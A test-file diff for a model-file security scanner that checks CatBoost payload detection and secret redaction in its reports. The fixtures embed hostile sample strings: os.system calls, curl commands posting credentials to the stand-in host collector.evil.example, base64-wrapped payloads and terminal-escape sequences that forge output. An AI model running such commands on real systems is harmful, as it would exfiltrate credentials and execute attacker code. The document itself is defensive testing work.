@@ -12,9 +12,13 @@ import pytest
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.integrations.sarif_formatter import format_sarif_output
-from modelaudit.scanners import get_scanner_for_file
+from modelaudit.scanners import catboost_scanner, get_scanner_for_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
-from modelaudit.scanners.catboost_scanner import CatBoostScanner, _redact_evidence_for_display
+from modelaudit.scanners.catboost_scanner import (
+    CatBoostScanner,
+    _redact_evidence_for_display,
+    _redact_reversible_base64_evidence,
+)
 from modelaudit.utils.file.detection import detect_file_format, detect_file_format_from_magic
 
 
@@ -1471,6 +1475,110 @@ def test_catboost_preserves_benign_short_urlsafe_base64_evidence() -> None:
 
     assert len(payload) == 20
     assert _redact_evidence_for_display(payload) == payload
+
+
+@pytest.mark.parametrize("urlsafe", [False, True])
+@pytest.mark.parametrize("marker", ["<redacted>", "<credentials-redacted>"])
+def test_attacker_base64_markers_do_not_authorize_decoded_evidence(
+    tmp_path: Path,
+    marker: str,
+    urlsafe: bool,
+) -> None:
+    raw = f"{marker} CATBOOST_RAW_SECRET_123456"
+    encoder = base64.urlsafe_b64encode if urlsafe else base64.b64encode
+    payload = encoder(raw.encode()).decode().rstrip("=")
+    model_path = tmp_path / f"attacker_marker_{marker[1]}_{urlsafe}.cbm"
+    model_path.write_bytes(
+        _build_cbm([f'os.system("id"); blob={payload}; https://collector.evil.example/upload']),
+    )
+
+    assert _redact_reversible_base64_evidence(payload) == payload
+    assert "CATBOOST_RAW_SECRET_123456" not in _redact_evidence_for_display(payload, max_chars=500)
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert "CATBOOST_RAW_SECRET_123456" not in failed_details
+    assert "CATBOOST_RAW_SECRET_123456" not in sarif
+
+
+def test_attacker_base64_marker_does_not_hide_real_assignment_redaction() -> None:
+    raw = '<redacted> password=hunter2 os.system("id")'
+    payload = base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")
+
+    redacted = _redact_reversible_base64_evidence(payload)
+
+    assert "hunter2" not in redacted
+    assert "[redacted marker]" in redacted
+    assert "password=<redacted>" in redacted
+
+
+def test_catboost_sarif_redacts_generic_serialized_and_ansi_credentials(tmp_path: Path) -> None:
+    secrets = ["dbpass7", "escaped8", "option9", "proxy10", "session11"]
+    model_path = tmp_path / "catboost_additional_credentials.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                f'os.system("psql postgresql://alice:{secrets[0]}@db.example/prod")',
+                rf'os.system("curl https:\/\/alice:{secrets[1]}@collector.evil.example/upload")',
+                f"os.system(\"curl --password $'{secrets[2]}' --proxy-user "
+                f"$'alice:{secrets[3]}' https://collector.evil.example/upload\")",
+                f'os.system("id"); session_id={secrets[4]}',
+            ],
+        ),
+    )
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in secrets:
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "postgresql://<credentials-redacted>@db.example/prod" in failed_details
+    assert "https://<credentials-redacted>@collector.evil.example/upload" in failed_details
+    assert "os.system" in failed_details
+
+
+def test_catboost_encoded_evidence_escapes_terminal_controls(tmp_path: Path) -> None:
+    decoded_base64 = ('os.system("id")\x1b[2J\x1b[HFORGED OUTPUT\n' + ("A" * 80)).encode()
+    base64_payload = base64.b64encode(decoded_base64).decode()
+    decoded_hex = b'os.system("id")\x1b[2J\rFORGED'
+    hex_payload = "".join(f"\\x{byte:02x}" for byte in decoded_hex)
+    model_path = tmp_path / "catboost_control_evidence.cbm"
+    model_path.write_bytes(_build_cbm([base64_payload, hex_payload]))
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    encoded_check = next(check for check in result.checks if check.name == "Encoded Payload Indicator Check")
+    excerpts = [match["excerpt"] for match in encoded_check.details["matches"]]
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert encoded_check.status == CheckStatus.FAILED
+    assert all("\x1b" not in excerpt and "\n" not in excerpt and "\r" not in excerpt for excerpt in excerpts)
+    assert "\x1b" not in sarif
+    assert "\r" not in sarif
+    assert any(r"\u001b" in excerpt for excerpt in excerpts)
+
+
+def test_catboost_evidence_wrapper_bounds_reversible_payload_scan(monkeypatch: pytest.MonkeyPatch) -> None:
+    processed_lengths: list[int] = []
+    original = catboost_scanner._redact_reversible_base64_evidence
+
+    def record_length(text: str, depth: int = 0) -> str:
+        processed_lengths.append(len(text))
+        return original(text, depth)
+
+    monkeypatch.setattr(catboost_scanner, "_redact_reversible_base64_evidence", record_length)
+
+    _redact_evidence_for_display('os.system("id") ' * 700_000, max_chars=160)
+
+    assert processed_lengths
+    assert max(processed_lengths) <= 160 + max(
+        catboost_scanner.EVIDENCE_REDACTION_LOOKAHEAD_CHARS,
+        catboost_scanner._MAX_ENCODED_EVIDENCE_CHARS,
+    )
 
 
 def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
